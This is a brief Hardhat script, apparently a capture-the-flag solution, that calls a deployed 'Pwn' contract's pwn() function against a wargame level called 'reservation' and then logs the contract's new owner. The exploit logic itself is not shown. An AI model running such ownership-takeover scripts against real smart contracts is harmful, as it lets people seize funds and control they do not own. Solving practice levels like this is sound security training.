import { ethers } from "hardhat"
import { LEVEL_ADDRESSES, PLAYER, ADDRESSES } from "../consts"
import { getSigner } from "../utils"
import { providers } from "ethers"

const pwn = async () => {
    const signer = await getSigner()
    const hack = await ethers.getContractAt(
        "contracts/Rezervation.sol:Pwn",
        ADDRESSES.rezervation,
        signer
    )
    const pwn = await hack.pwn(LEVEL_ADDRESSES.reservation) //manual gas limit required
    await pwn.wait()


    const owner = await hack.owner()
    console.log("Caller", signer?.address)
    console.log("New Owner", owner)
}

pwn()